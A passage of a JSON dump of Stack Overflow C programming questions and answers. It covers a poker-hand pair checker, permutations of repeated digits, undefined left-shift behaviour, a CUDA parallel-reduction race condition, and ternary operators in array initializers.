printf(\"%u == %u &amp;&amp; %u != %u\\n\", hand[i].face, hand[j].face, hand[i].face, faces[facePos]);\n            if (hand[i].face == hand[j].face &amp;&amp; hand[i].face != faces[facePos]) count++;\n        }\n\n        faces[facePos] = hand[i].face;\n        if (count == num) facePos++;\n    }\n\n    return facePos;\n}\n</code></pre>\n\n<p>Some of this isn't my code, I was given a basic card shuffling type of program and told to modify it to deal a hand and check for pairs/three of a kind.  Like I said this does work when I set the return value of checkX as a variable and then compare i to that instead of directly, I just don't know why.  I've tried disabling gcc optimization, which didn't seem to make a difference.</p>\n\n<p>Output from direct func comparison:</p>\n\n<pre><code>1 == 7 &amp;&amp; 1 != 0\n1 == 1 &amp;&amp; 1 != 0\n1 == 4 &amp;&amp; 1 != 0\n1 == 7 &amp;&amp; 1 != 0\n7 == 1 &amp;&amp; 7 != 0\n7 == 4 &amp;&amp; 7 != 0\n7 == 7 &amp;&amp; 7 != 0\n1 == 4 &amp;&amp; 1 != 0\n1 == 7 &amp;&amp; 1 != 0\n4 == 7 &amp;&amp; 4 != 1\nPair of Deuces\n1 == 7 &amp;&amp; 1 != 1\n1 == 1 &amp;&amp; 1 != 1\n1 == 4 &amp;&amp; 1 != 1\n1 == 7 &amp;&amp; 1 != 1\n7 == 1 &amp;&amp; 7 != 1\n7 == 4 &amp;&amp; 7 != 1\n7 == 7 &amp;&amp; 7 != 1\n1 == 4 &amp;&amp; 1 != 7\n1 == 7 &amp;&amp; 1 != 7\n4 == 7 &amp;&amp; 4 != 1\n</code></pre>\n\n<p>Output from indirect comparison of func using variable:</p>\n\n<pre><code>1 == 7 &amp;&amp; 1 != 0\n1 == 1 &amp;&amp; 1 != 0\n1 == 4 &amp;&amp; 1 != 0\n1 == 7 &amp;&amp; 1 != 0\n7 == 1 &amp;&amp; 7 != 0\n7 == 4 &amp;&amp; 7 != 0\n7 == 7 &amp;&amp; 7 != 0\n1 == 4 &amp;&amp; 1 != 0\n1 == 7 &amp;&amp; 1 != 0\n4 == 7 &amp;&amp; 4 != 1\nPair of Deuces\nPair of Eights\n</code></pre>\n\n<p>I know this code isn't the nicest but I had to work with what was given and just need to make it work, so this question is just out of curiosity.</p>\n"}, {"tags": ["c", "string", "algorithm", "combinations", "backtracking"], "comments": [{"owner": {"reputation": 9215, "user_id": 5212827, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/7e9f9b0d7e2d571c9f8886dd54bd50f9?s=128&d=identicon&r=PG&f=1", "display_name": "DeiDei", "link": "https://stackoverflow.com/users/5212827/deidei"}, "edited": false, "score": 1, "creation_date": 1517986320, "post_id": 48657599, "comment_id": 84312816, "body": "<code>The solution must be recursive since it uses large values.</code> Why?"}, {"owner": {"reputation": 57, "user_id": 6920418, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/eb4b4881fdd237881e92c8af090c8c0e?s=128&d=identicon&r=PG&f=1", "display_name": "King Tsunamy", "link": "https://stackoverflow.com/users/6920418/king-tsunamy"}, "reply_to_user": {"reputation": 9215, "user_id": 5212827, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/7e9f9b0d7e2d571c9f8886dd54bd50f9?s=128&d=identicon&r=PG&f=1", "display_name": "DeiDei", "link": "https://stackoverflow.com/users/5212827/deidei"}, "edited": false, "score": 0, "creation_date": 1517986511, "post_id": 48657599, "comment_id": 84312899, "body": "@DeiDei Looping will give repeated values and it&#39;s hard to check if it repeated already.I guess"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 2, "creation_date": 1517986554, "post_id": 48657599, "comment_id": 84312926, "body": "There are 85 billion possible arrangements of those digits. So regardless of how you do it, it&#39;s not going to be fast."}, {"owner": {"reputation": 65718, "user_id": 844416, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e39c2364935265593d76247ddc6d07c?s=128&d=identicon&r=PG", "display_name": "MBo", "link": "https://stackoverflow.com/users/844416/mbo"}, "edited": false, "score": 2, "creation_date": 1517986564, "post_id": 48657599, "comment_id": 84312931, "body": "Just learn about <code>Next lexicographical permutation</code> algorithm. Most implementations work with repeated elements.Note that you cannot hope to get all permutations for long strings - their number might be too high."}, {"owner": {"reputation": 57, "user_id": 6920418, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/eb4b4881fdd237881e92c8af090c8c0e?s=128&d=identicon&r=PG&f=1", "display_name": "King Tsunamy", "link": "https://stackoverflow.com/users/6920418/king-tsunamy"}, "reply_to_user": {"reputation": 65718, "user_id": 844416, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e39c2364935265593d76247ddc6d07c?s=128&d=identicon&r=PG", "display_name": "MBo", "link": "https://stackoverflow.com/users/844416/mbo"}, "edited": false, "score": 0, "creation_date": 1517986778, "post_id": 48657599, "comment_id": 84313037, "body": "@MBo I will check now,I saw some other similar questions like mine but none of the answers were in C and those in C were optimized only for 2/3 chars string"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1517987393, "post_id": 48657599, "comment_id": 84313337, "body": "My answer to <a href=\"https://stackoverflow.com/questions/31826746/trying-to-generate-9-digit-numbers-with-each-unique-digits\">this question</a> will generate all 85 billion combinations in about 500 seconds, and yes, it&#39;s in C."}, {"owner": {"reputation": 57, "user_id": 6920418, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/eb4b4881fdd237881e92c8af090c8c0e?s=128&d=identicon&r=PG&f=1", "display_name": "King Tsunamy", "link": "https://stackoverflow.com/users/6920418/king-tsunamy"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1517988336, "post_id": 48657599, "comment_id": 84313771, "body": "@user3386109 here they don&#39;t have unique digits"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1517988496, "post_id": 48657599, "comment_id": 84313844, "body": "The digits don&#39;t need to be unique. The digits in the question were unique, but my answer works with duplicate digits. Try my answer with a small test case  so you can verify the results yourself"}, {"owner": {"reputation": 57, "user_id": 6920418, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/eb4b4881fdd237881e92c8af090c8c0e?s=128&d=identicon&r=PG&f=1", "display_name": "King Tsunamy", "link": "https://stackoverflow.com/users/6920418/king-tsunamy"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1517992529, "post_id": 48657599, "comment_id": 84315850, "body": "@user3386109 your code doesn&#39;t work for 0.It will never generate 0000111 and 011111 for example.but I don&#39;t know if 0000111 should be considered as as solution.Anyway it&#39;s a very good algorithm.PS:My bad it did works with 0,the window output just didnt showed all the results.So sorry"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1518029649, "post_id": 48657599, "comment_id": 84340487, "body": "Glad that worked for you. Good luck with the project!"}], "owner": {"reputation": 57, "user_id": 6920418, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/eb4b4881fdd237881e92c8af090c8c0e?s=128&d=identicon&r=PG&f=1", "display_name": "King Tsunamy", "link": "https://stackoverflow.com/users/6920418/king-tsunamy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 42, "favorite_count": 0, "closed_date": 1517987639, "answer_count": 0, "score": 0, "last_activity_date": 1517986096, "creation_date": 1517986096, "question_id": 48657599, "link": "https://stackoverflow.com/questions/48657599/getting-multiple-strings-with-repeated-character", "closed_reason": "Duplicate", "title": "Getting multiple strings with repeated character", "body": "<p>The problem is getting all possible combinations of that string with permutations.\nThe solution must be recursive since it uses large values.\nFor example the number can be </p>\n\n<pre><code>888888888999900000000000000000\n</code></pre>\n\n<p>I thought to make a loop and change the position of elements if I put the <code>n</code> element on first position and then the <code>n-1</code> element on last position I get the same result so this solution generated duplicates.</p>\n\n<p>I don't see any solution for now to be efficient or even to work because changing a position of a character and the changing all other chars position is not a solution at all.\nAny hint would be helpful.</p>\n\n<p>I also know the number of each character that is in string from beginning so I don't have to count the number of 8 ,9 and 0.</p>\n"}, {"tags": ["c", "compilation", "bit-manipulation", "bitwise-operators"], "comments": [{"owner": {"reputation": 9215, "user_id": 5212827, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/7e9f9b0d7e2d571c9f8886dd54bd50f9?s=128&d=identicon&r=PG&f=1", "display_name": "DeiDei", "link": "https://stackoverflow.com/users/5212827/deidei"}, "edited": false, "score": 2, "creation_date": 1517984739, "post_id": 48657246, "comment_id": 84312111, "body": "Are you asking why -1 is 11111111 and -2 is 11111110 in binary? The compiler just shifts the bits to the left, no magic there. How you interpret the bits depends on your system, but it is most likely <i>two&#39;s complement</i>. Google that."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1517985263, "post_id": 48657246, "comment_id": 84312336, "body": "The bahavior is undefined: &quot;The result of E1 &lt;&lt; E2 is .........  If E1 has a <b>signed type and nonnegative value</b>, and E1&#215;2E2 is representable in the result type, then that is the resulting value; <b>otherwise, the behavior is unde\ufb01ned.</b>&quot;"}, {"owner": {"reputation": 1052, "user_id": 3698648, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/199b49d13342baa233c08aac5793ed4d?s=128&d=identicon&r=PG&f=1", "display_name": "ntshetty", "link": "https://stackoverflow.com/users/3698648/ntshetty"}, "edited": false, "score": 0, "creation_date": 1517985356, "post_id": 48657246, "comment_id": 84312376, "body": "For me it&#39;s prints fffffffe --&gt;-2 not ffffffff."}, {"owner": {"reputation": 476, "user_id": 2490398, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/LRLbK.jpg?s=128&g=1", "display_name": "Dr. Essen", "link": "https://stackoverflow.com/users/2490398/dr-essen"}, "edited": false, "score": 0, "creation_date": 1517986147, "post_id": 48657246, "comment_id": 84312740, "body": "Sorry for the duplicate question. I couldn&#39;t find the similar one."}], "answers": [{"comments": [{"owner": {"reputation": 476, "user_id": 2490398, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/LRLbK.jpg?s=128&g=1", "display_name": "Dr. Essen", "link": "https://stackoverflow.com/users/2490398/dr-essen"}, "edited": false, "score": 0, "creation_date": 1517986108, "post_id": 48657441, "comment_id": 84312726, "body": "Thanks, I didn&#39;t know the undefined behaviour in this case!"}], "tags": [], "owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "is_accepted": true, "score": 1, "last_activity_date": 1517985436, "creation_date": 1517985436, "answer_id": 48657441, "question_id": 48657246, "link": "https://stackoverflow.com/questions/48657246/shift-left-bit-of-1/48657441#48657441", "title": "shift left bit of -1", "body": "<p>When I run your program, it outputs \u201cfffffffe\u201d. However, the behavior is undefined. The C standard says that a left shift is defined only if the value being shifted is non-negative (and then only if the shift does not overflow). So, when you evaluate <code>-1 &lt;&lt; 1</code>, a C implementation is allowed to do anything.</p>\n"}], "owner": {"reputation": 476, "user_id": 2490398, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/LRLbK.jpg?s=128&g=1", "display_name": "Dr. Essen", "link": "https://stackoverflow.com/users/2490398/dr-essen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 177, "favorite_count": 0, "closed_date": 1517985474, "accepted_answer_id": 48657441, "answer_count": 1, "score": 0, "last_activity_date": 1517985436, "creation_date": 1517984568, "last_edit_date": 1592644375, "question_id": 48657246, "link": "https://stackoverflow.com/questions/48657246/shift-left-bit-of-1", "closed_reason": "Duplicate", "title": "shift left bit of -1", "body": "<p>While solving problems, I stuck here thinking how the output of this program gives <code>ffffffff</code>. Since the left shift of bits should give -2. I cross-checked here <a href=\"http://calculator.vhex.net/calculator/bit/shift-bits-of-a-number-to-the-left\" rel=\"nofollow noreferrer\">Online Calculator</a> giving -2. I can see the binary value of -1 is 11111111. But how?\nAlso, my observance from here <a href=\"http://www.binaryconvert.com/result_signed_short.html?decimal=045049\" rel=\"nofollow noreferrer\">Signed int conversion</a>:</p>\n<blockquote>\n<p>-1 ---&gt; 0xff --&gt; 1111 1111</p>\n<p>-2 ---&gt; 0xfe --&gt; 1111 1110</p>\n<p>-3 ---&gt; 0xfd --&gt; 1111 1101</p>\n<p>-8 ---&gt; 0xf8 --&gt; 1111 1000</p>\n</blockquote>\n<pre><code>#include&lt;stdio.h&gt;\nint main()\n{\n   printf(&quot;%x&quot;, -1&lt;&lt;1);\n   getchar();\n   return 0;\n}  \n</code></pre>\n<p>Please tell me how the compiler looks integers below 0 when bitwise shift operators are used?</p>\n"}, {"tags": ["c++", "c", "cuda", "nvidia"], "answers": [{"comments": [{"owner": {"reputation": 175, "user_id": 9325713, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2b644eb25e8365ef79f80f6a9173debc?s=128&d=identicon&r=PG&f=1", "display_name": "Sanchit Anand", "link": "https://stackoverflow.com/users/9325713/sanchit-anand"}, "edited": false, "score": 0, "creation_date": 1518026481, "post_id": 48659285, "comment_id": 84338691, "body": "In the parallel reduction reference, they stated that, once you reach the last 32 threads, they behave as if they all belong to the same warp, and there is no need for synchronization. I am using almost the same code for reduction."}, {"owner": {"reputation": 1020, "user_id": 2768788, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/8360e8b8fd53fe27102b39bbd7412e8b?s=128&d=identicon&r=PG&f=1", "display_name": "Henkersmann", "link": "https://stackoverflow.com/users/2768788/henkersmann"}, "reply_to_user": {"reputation": 175, "user_id": 9325713, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2b644eb25e8365ef79f80f6a9173debc?s=128&d=identicon&r=PG&f=1", "display_name": "Sanchit Anand", "link": "https://stackoverflow.com/users/9325713/sanchit-anand"}, "edited": false, "score": 0, "creation_date": 1518104224, "post_id": 48659285, "comment_id": 84376437, "body": "I have updated the answer; The difference between your code and the one in the Guide is the volatile pointer."}], "tags": [], "owner": {"reputation": 1020, "user_id": 2768788, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/8360e8b8fd53fe27102b39bbd7412e8b?s=128&d=identicon&r=PG&f=1", "display_name": "Henkersmann", "link": "https://stackoverflow.com/users/2768788/henkersmann"}, "is_accepted": true, "score": 3, "last_activity_date": 1518104171, "last_edit_date": 1518104171, "creation_date": 1517992802, "answer_id": 48659285, "question_id": 48657179, "link": "https://stackoverflow.com/questions/48657179/cuda-matrix-multiplication-using-parallel-reduction/48659285#48659285", "title": "CUDA Matrix Multiplication using Parallel Reduction", "body": "<blockquote>\n  <ol>\n  <li>Why the code is returning incorrect results.</li>\n  </ol>\n</blockquote>\n\n<p>In the last step of your reduction (<code>e &lt; 32</code>) you are breaking with your method. This leads to race conditions on the same element of result, e.g.         </p>\n\n<pre><code>result[e] += result[e + 16];\n</code></pre>\n\n<p>For <code>e==0</code> this means <code>read result[16]</code>, whereas in the same step/at the same time for <code>e==16</code> the operation means <code>write result[16]</code>.</p>\n\n<p>To avoid the race condition you have two options: </p>\n\n<ul>\n<li>Use a pointer that is declared <code>volatile</code> like in the document you\nlinked (p. 78) [edited]</li>\n<li><p>Continue the <code>if( e &lt; ...)</code> as before  or transform all the ifs into a loop with:</p>\n\n<pre><code>for(int size=blockdim.x/2; size&gt;0; size/=2)\n  if(e &lt; size)\n    ...\n</code></pre></li>\n</ul>\n\n<blockquote>\n  <ol start=\"2\">\n  <li>Why it is taking much longer to run than the method using shared memory described in Chapter 3, page 25 of the CUDA C Programming\n  Guide.</li>\n  </ol>\n</blockquote>\n\n<p>Accessing shared memory is much faster than accessing global memory. You are storing your intermediate result in shared memory, whereas the example you reference is storing the parts of the matrices to be read. In the example this is combined with loop tiling and every thread only loads one element of the whole tile from global memory, but later reads <code>TILE_WIDTH * 2</code> elements. </p>\n\n<p>The higher performance of the example directly comes from a reduced time waiting for data to be loaded from global memory.</p>\n"}], "owner": {"reputation": 175, "user_id": 9325713, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2b644eb25e8365ef79f80f6a9173debc?s=128&d=identicon&r=PG&f=1", "display_name": "Sanchit Anand", "link": "https://stackoverflow.com/users/9325713/sanchit-anand"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 636, "favorite_count": 0, "accepted_answer_id": 48659285, "answer_count": 1, "score": 1, "last_activity_date": 1518104171, "creation_date": 1517984308, "question_id": 48657179, "link": "https://stackoverflow.com/questions/48657179/cuda-matrix-multiplication-using-parallel-reduction", "title": "CUDA Matrix Multiplication using Parallel Reduction", "body": "<p>I am quite new to CUDA programming, and I wanted to try an implementation of matrix multiplication using <a href=\"http://developer.download.nvidia.com/compute/cuda/1.1-Beta/x86_website/projects/reduction/doc/reduction.pdf\" rel=\"nofollow noreferrer\">Parallel Reduction</a>. I came up with this code, and would like clarifications on : </p>\n\n<ol>\n<li>Why the code is returning incorrect results.</li>\n<li>Why it is taking much longer to run than the method using shared memory described in Chapter 3, page 25 of the <a href=\"https://developer.download.nvidia.com/compute/DevZone/docs/html/C/doc/CUDA_C_Programming_Guide.pdf\" rel=\"nofollow noreferrer\">CUDA C Programming Guide</a>.</li>\n</ol>\n\n<p>For reference, I am running it on NVIDIA GeForce GTX 675M , which has a compute capability of 2.1 . </p>\n\n<pre><code>#include &lt;cuda_runtime_api.h&gt;\n#include \"device_launch_parameters.h\"\n\n\n#include &lt;cuda.h&gt;\n#include &lt;device_functions.h&gt;\n\n#include \"cuda_runtime.h\"\n\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;time.h&gt;\n#include &lt;math.h&gt;\n#define BLOCK_OPT 1024\ntypedef struct {\n    int width;\n    int height;\n    int stride;\n    float* elements;\n}Matrix;\n\n\n\n\n\n__global__ void MatMulOPT(Matrix A, Matrix B, Matrix C)\n{\n    __shared__ float result[BLOCK_OPT];\n    int e = threadIdx.x;\n    int row = blockIdx.x;\n    int col = blockIdx.y;\n\n    result[e] = A.elements[row*A.stride + e] * B.elements[e*B.stride + col];\n    __syncthreads();\n    if (e &lt; 512)\n    {\n        result[e] += result[e + 512];\n    }\n    __syncthreads();\n    if (e &lt; 256)\n    {\n        result[e] += result[e + 256];\n    }\n    __syncthreads();\n    if (e &lt; 128)\n    {\n        result[e] += result[e + 128];\n    }\n    __syncthreads();\n    if (e &lt; 64)\n    {\n        result[e] += result[e + 64];\n    }\n    __syncthreads();\n\n    if (e &lt; 32)\n    {\n        result[e] += result[e + 32];\n        result[e] += result[e + 16];\n        result[e] += result[e + 8];\n        result[e] += result[e + 4];\n        result[e] += result[e + 2];\n        result[e] += result[e + 1];\n    }\n\n    if (e == 0)C.elements[row*C.stride + col] = result[0];\n\n\n}\nvoid MatMulCPU(Matrix A, Matrix B, Matrix C)\n{\n    for (int i = 0; i &lt; A.height; i++)\n    {\n        for (int j = 0; j &lt; B.width; j++)\n        {\n            for (int k = 0; k &lt; B.height; k++)\n            {\n                C.elements[i*C.stride + j] += A.elements[i*A.stride+k] * B.elements[k*B.stride + j];\n            }\n        }\n    }\n\n}\n\nfloat randomFloat()\n{\n    return (float)rand() / (float)RAND_MAX;\n}\n\nint main()\n{\n    clock_t begin, end;\n\n    srand(time(NULL));\n\n    //Common Setup\n    float cpu_t = 0, gpu_t = 0;\n    int x = 1024;\n    int N = x * x;\n    size_t size = N * sizeof(float);\n    Matrix A;\n    A.width = x;\n    A.stride = x;\n    A.height = x;\n    A.elements = (float*)malloc(size);\n\n    for (int i = 0; i &lt; N; i++)\n        A.elements[i] = randomFloat();\n\n    Matrix B;\n    B.width = x;\n    B.stride = x;\n    B.height = x;\n    B.elements = (float*)malloc(size);\n\n    for (int j = 0; j &lt; N; j++)\n        B.elements[j] = randomFloat();\n\n    Matrix C;\n    C.width = x;\n    C.stride = x;\n    C.height = x;\n    C.elements = (float*)malloc(size);\n    for (int k = 0; k &lt; N; k++)\n        C.elements[k] = 0;\n\n    Matrix D;\n    D.width = x;\n    D.stride = x;\n    D.height = x;\n    D.elements = (float*)malloc(size);\n    for (int l = 0; l &lt; N; l++)\n        D.elements[l] = 0;\n\n    //Execute CPU code &amp; time it\n     begin = clock();\n    MatMulCPU(A, B, D);\n    end = clock();\n    cpu_t = (float)end - begin;\n\n\n    // GPU setup\n\n    Matrix d_A, d_B, d_C;\n    d_A.width = x;\n    d_A.stride = x;\n    d_A.height = x;\n    d_B.width = x;\n    d_B.stride = x;\n    d_B.height = x;\n    d_C.width = x;\n    d_C.stride = x;\n    d_C.height = x;\n\n\n    cudaMalloc(&amp;d_A.elements, size);\n    cudaMemcpy(d_A.elements, A.elements, size, cudaMemcpyHostToDevice);\n    cudaMalloc(&amp;d_B.elements, size);\n    cudaMemcpy(d_B.elements, B.elements, size, cudaMemcpyHostToDevice);\n    cudaMalloc(&amp;d_C.elements, size);\n    cudaMemcpy(d_C.elements, C.elements, size, cudaMemcpyHostToDevice);\n\n\n    //Special Parameters\n    int optBlockSize = BLOCK_OPT;\n    dim3 optDimGrid(x, x);\n\n    //Execute GPU Kernel and time it\n    begin = clock();\n    cudaThreadSynchronize();\n    MatMulOPT &lt;&lt; &lt;optDimGrid, optBlockSize &gt;&gt; &gt; (d_A, d_B, d_C);\n    cudaThreadSynchronize();\n    end = clock();\n    gpu_t = (float)end - begin;\n\n    cudaMemcpy(C.elements, d_C.elements, size, cudaMemcpyDeviceToHost);\n\n\n\n\n    //Do a memcheck \n    bool passed = true;\n    for (int k = 0; k &lt; N; k++)\n    {\n        //printf(\"%f \",C.elements[k]);\n        if (fabs(C.elements[k] -D.elements[k] ) &gt; 1e-6)\n        {\n\n            passed = false;\n            printf(\"\\nFAIL\\n\");\n            printf(\"C[%d] = %f, D[%d] = %f\\n\",k,C.elements[k],k,D.elements[k]);\n            break;\n        }\n\n    }\n    printf(\"\\n\");\n    if (passed)\n        printf(\"PASSED\\n\");\n\n    printf(\"CPU Elapsed Time: %f\\n\", cpu_t);\n    printf(\"GPU Elapsed Time: %f\\n\", gpu_t);\n\n    //Clear all GPU memory\n    cudaFree(d_A.elements);\n    cudaFree(d_B.elements);\n    cudaFree(d_C.elements);\n    //Clear all CPU memory\n    free(A.elements);\n    free(B.elements);\n    free(C.elements);\n\n}\n</code></pre>\n"}, {"tags": ["c", "c99"], "comments": [{"owner": {"reputation": 29848, "user_id": 5958455, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/lBWIE.png?s=128&g=1", "display_name": "iBug", "link": "https://stackoverflow.com/users/5958455/ibug"}, "edited": false, "score": 0, "creation_date": 1517985038, "post_id": 48657128, "comment_id": 84312241, "body": "I have a feeling that @coderredoc is having a decent answer."}], "answers": [{"comments": [{"owner": {"reputation": 29848, "user_id": 5958455, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/lBWIE.png?s=128&g=1", "display_name": "iBug", "link": "https://stackoverflow.com/users/5958455/ibug"}, "edited": false, "score": 0, "creation_date": 1517985374, "post_id": 48657165, "comment_id": 84312384, "body": "Strange, why can&#39;t I reproduce?"}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 0, "creation_date": 1517985877, "post_id": 48657165, "comment_id": 84312620, "body": "What&#39;s the storage duration of <code>foo</code>? What&#39;s <code>bar</code> in your example? What does a warning message without the <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> which produces it prove?"}], "tags": [], "owner": {"reputation": 200780, "user_id": 116908, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/54d38793d7a407446999b33b81d607fd?s=128&d=identicon&r=PG", "display_name": "Carl Norum", "link": "https://stackoverflow.com/users/116908/carl-norum"}, "is_accepted": false, "score": 2, "last_activity_date": 1517984223, "creation_date": 1517984223, "answer_id": 48657165, "question_id": 48657128, "link": "https://stackoverflow.com/questions/48657128/ternary-operator-in-array-initalization/48657165#48657165", "title": "Ternary operator in array initalization", "body": "<p>No. From <code>clang</code>:</p>\n\n<pre><code>example.c:4:15: warning: initializer for aggregate is not a compile-time\n      constant [-Wc99-extensions]\n        int foo[] = {bar? 9U:20U};\n                     ^~~~~~~~~~~\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 157, "user_id": 4039207, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/6ed35267961546abaae338b80f713747?s=128&d=identicon&r=PG&f=1", "display_name": "user259819", "link": "https://stackoverflow.com/users/4039207/user259819"}, "edited": false, "score": 0, "creation_date": 1517985778, "post_id": 48657440, "comment_id": 84312577, "body": "Does the initalizer has to be compile-time evaluable? Referring to @Carl Norum"}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "reply_to_user": {"reputation": 157, "user_id": 4039207, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/6ed35267961546abaae338b80f713747?s=128&d=identicon&r=PG&f=1", "display_name": "user259819", "link": "https://stackoverflow.com/users/4039207/user259819"}, "edited": false, "score": 0, "creation_date": 1517985813, "post_id": 48657440, "comment_id": 84312588, "body": "@user259819 - Only for objects with static storage duration."}], "tags": [], "owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "is_accepted": true, "score": 7, "last_activity_date": 1517986040, "last_edit_date": 1517986040, "creation_date": 1517985435, "answer_id": 48657440, "question_id": 48657128, "link": "https://stackoverflow.com/questions/48657128/ternary-operator-in-array-initalization/48657440#48657440", "title": "Ternary operator in array initalization", "body": "<p>Yes, you may. Starting from the grammar production for an initalizer:</p>\n\n<p><strong>6.7.8 Initialization</strong></p>\n\n<blockquote>\n<pre><code>initializer:\n       assignment-expression\n       { initializer-list }\n       { initializer-list , }\ninitializer-list:\n       designation(optional) initializer\n       initializer-list , designation(optional) initializer\n</code></pre>\n</blockquote>\n\n<p>The only relevant (in my opinion) constraint on the initializer in that section is that it must be a constant expression for objects with static storage duration:</p>\n\n<blockquote>\n  <p>All the expressions in an initializer for an object that has static\n  storage duration shall be constant expressions or string literals.</p>\n</blockquote>\n\n<p>Following it onward to the production of <code>assignment-expression</code>, we see that</p>\n\n<p><strong>6.5.16 Assignment operators</strong></p>\n\n<blockquote>\n<pre><code>assignment-expression:\n        conditional-expression\n        unary-expression assignment-operator assignment-expression\n</code></pre>\n</blockquote>\n\n<p>A conditional expression is a valid assignment expression as well. So it may appear as an initializer in an initializer list. The only thing left to check is that it can be a valid constant expression for objects with static storage duration.</p>\n\n<p><strong>6.6 Constant expressions</strong></p>\n\n<blockquote>\n<pre><code>constant-expression:\n         conditional-expression\n</code></pre>\n</blockquote>\n\n<p>With the following constraint and semantic paragraphs:</p>\n\n<blockquote>\n  <p>Constant expressions shall not contain assignment, increment,\n  decrement, function-call, or comma operators, except when they are\n  contained within a subexpression that is not evaluated.</p>\n  \n  <p>More latitude is permitted for constant expressions in initializers.\n  Such a constant expression shall be, or evaluate to, one of the\n  following:</p>\n  \n  <ul>\n  <li>an arithmetic constant expression,</li>\n  <li>a null pointer constant,</li>\n  <li>an address constant, or</li>\n  <li>an address constant for an object type plus or minus an integer constant expression.</li>\n  </ul>\n</blockquote>\n\n<p>So all of the above makes for the following valid program:</p>\n\n<pre><code>#include &lt;stdint.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define BAR 1\n\nuint8_t foo[] = {BAR ? 9U:20U};\n\nint main(void) {\n   int bar = 